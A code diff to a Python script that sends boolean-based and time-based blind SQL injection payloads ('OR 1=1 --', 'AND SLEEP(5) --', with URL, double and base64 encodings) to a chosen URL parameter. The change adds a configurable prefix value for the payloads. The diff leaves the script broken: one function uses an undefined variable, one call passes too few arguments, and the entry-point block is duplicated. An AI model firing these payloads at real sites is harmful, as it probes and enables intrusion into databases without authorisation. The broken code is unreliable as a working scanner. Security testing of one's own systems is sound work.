@@ -6,24 +6,24 @@ import time
 import argparse
 
 TRUE_PAYLOADS = [
-    "1' AND 1=1 --",
-    "1 AND 1=1 --",
-    "1' OR 1=1 --",
-    "1 OR 1=1 --",
+    "' AND 1=1 --",
+    " AND 1=1 --",
+    "' OR 1=1 --",
+    " OR 1=1 --",
 ]
 
 FALSE_PAYLOADS = [
-    "1' AND 1=2 --",
-    "1 AND 1=2 --",
-    "1' OR 1=2 --",
-    "1 OR 1=2 --",
+    "' AND 1=2 --",
+    " AND 1=2 --",
+    "' OR 1=2 --",
+    " OR 1=2 --",
 ]
 
 TIME_BASED_PAYLOADS = [
-    "1' AND SLEEP(5) --",
-    "1 AND SLEEP(5) --",
-    "1' OR SLEEP(5) --",
-    "1 OR SLEEP(5) --",
+    "' AND SLEEP(5) --",
+    " AND SLEEP(5) --",
+    "' OR SLEEP(5) --",
+    " OR SLEEP(5) --",
 ]
 
 ENCODINGS = ["none", "url", "double", "base64"]
@@ -45,10 +45,11 @@ def encode_payload(payload, method):
         print(f"Unknown encoding method: {method}")
         return payload
 
-def boolean_based_sqli(url, param, encoding):
+def boolean_based_sqli(url, param, encoding, value):
     sizes = []
     for payload in TRUE_PAYLOADS:
-        encoded_payload = encode_payload(payload, encoding)
+        full_payload = f"{value}{payload}"
+        encoded_payload = encode_payload(full_payload, encoding)
         try:
             response = requests.get(url, params={param: encoded_payload}, headers=HEADERS, timeout=10)
             if response.status_code == 200:
@@ -57,10 +58,11 @@ def boolean_based_sqli(url, param, encoding):
             print(f"[!] Request error: {e}")
     return sum(sizes) / len(sizes) if sizes else None
 
-def boolean_based_errors(url, param, encoding):
+def boolean_based_errors(url, param, encoding, value):
     sizes = []
     for payload in FALSE_PAYLOADS:
-        encoded_payload = encode_payload(payload, encoding)
+        full_payload = f"{value}{payload}"
+        encoded_payload = encode_payload(full_payload, encoding)
         try:
             response = requests.get(url, params={param: encoded_payload}, headers=HEADERS, timeout=10)
             if response.status_code == 200:
@@ -68,6 +70,24 @@ def boolean_based_errors(url, param, encoding):
         except requests.exceptions.RequestException as e:
             print(f"[!] Request error: {e}")
     return sum(sizes) / len(sizes) if sizes else None
+
+def time_based_injections(url, param, encoding, value):
+    for payload in TIME_BASED_PAYLOADS:
+        full_payload = f"{value}{payload}"
+        encoded_payload = encode_payload(full_payload, encoding)
+        try:
+            start_time = time.time()
+            requests.get(url, params={param: encoded_payload}, headers=HEADERS, timeout=15)
+            end_time = time.time()
+
+            if (end_time - start_time) > 5:
+                print("[+] The parameter is likely vulnerable to Time Based Blind SQL injection")
+                return True
+        except requests.exceptions.RequestException as e:
+            print(f"[!] Request error: {e}")
+
+    print("[-] The parameter is not likely vulnerable to Time Based Blind SQL injection")
+    return False
 
 def compare_response_sizes(url, param, encoding):
     try:
@@ -77,8 +97,8 @@ def compare_response_sizes(url, param, encoding):
         print(f"[!] Could not reach target: {e}")
         return False
 
-    true_size = boolean_based_sqli(url, param, encoding)
-    false_size = boolean_based_errors(url, param, encoding)
+    true_size = boolean_based_sqli(url, param, encoding, value)
+    false_size = boolean_based_errors(url, param, encoding, value)
 
     if true_size is None or false_size is None:
         print("Could not retrieve valid responses for comparison")
@@ -94,28 +114,12 @@ def compare_response_sizes(url, param, encoding):
         print("[-] The parameter is not likely vulnerable to Boolean Based Blind SQL injection")
         return False
 
-def time_based_injections(url, param, encoding):
-    for payload in TIME_BASED_PAYLOADS:
-        encoded_payload = encode_payload(payload, encoding)
-        try:
-            start_time = time.time()
-            requests.get(url, params={param: encoded_payload}, headers=HEADERS, timeout=15)
-            end_time = time.time()
-
-            if (end_time - start_time) > 5:
-                print("[+] The parameter is likely vulnerable to Time Based Blind SQL injection")
-                return True
-        except requests.exceptions.RequestException as e:
-            print(f"[!] Request error: {e}")
-
-    print("[-] The parameter is not likely vulnerable to Time Based Blind SQL injection")
-    return False
-
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("-u", "--url", required=True, help="URL to test")
     parser.add_argument("-p", "--param", required=True, help="Parameter to test")
     parser.add_argument("-e", "--encode", help="Encoding method (none, url, double, base64)", default="none")
+    parser.add_argument("-v", "--value", help="Value to test the parameter against", default=1)
     args = parser.parse_args()
 
     encoding = args.encode if args.encode else "none"
@@ -128,9 +132,13 @@ def main():
             if time_based_injections(args.url, args.param, enc):
                 return
     else:
-        if not compare_response_sizes(args.url, args.param, encoding):
-            if not time_based_injections(args.url, args.param, encoding):
+        if not compare_response_sizes(args.url, args.param, encoding, args.value):
+            if not time_based_injections(args.url, args.param, encoding, args.value):
                 print("[-] No SQL injection detected. Exiting...")
+
+if __name__ == "__main__":
+    main()
+
 
 if __name__ == "__main__":
     main()
